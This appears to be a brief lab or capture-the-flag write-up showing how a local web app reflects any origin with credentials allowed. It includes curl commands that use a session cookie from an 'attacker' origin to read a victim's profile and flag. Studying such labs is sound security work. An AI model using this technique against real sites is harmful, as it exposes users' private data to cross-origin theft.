# Finding the Bug

Start the lab:

```bash
docker compose up --build -d
```

Send a preflight from an arbitrary origin and check the response headers:

```bash
curl -sI -X OPTIONS http://localhost:8080/api/profile \
  -H 'Origin: https://attacker.example.com' \
  -H 'Access-Control-Request-Method: GET'
```

```
HTTP/1.0 204 No Content
Access-Control-Allow-Origin: https://attacker.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
Access-Control-Allow-Methods: GET, OPTIONS
Access-Control-Allow-Headers: Content-Type
```

The server reflected `https://attacker.example.com` back verbatim. With `Access-Control-Allow-Credentials: true` present alongside a reflected origin, any authenticated cross-origin request will succeed.

Log in to get a session cookie:

```bash
curl -sc /tmp/cors-cookies.txt -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}'
```

```json
{"status": "logged in", "user": "alice"}
```

Now read the protected endpoint from an attacker origin using that cookie:

```bash
curl -sb /tmp/cors-cookies.txt http://localhost:8080/api/profile \
  -H 'Origin: https://attacker.example.com'
```

```json
{
  "username": "alice",
  "email": "alice@corp.internal",
  "role": "user",
  "flag": "POC{...}"
}
```

The response is fully readable from the attacker's origin. The flag is in the `flag` field.
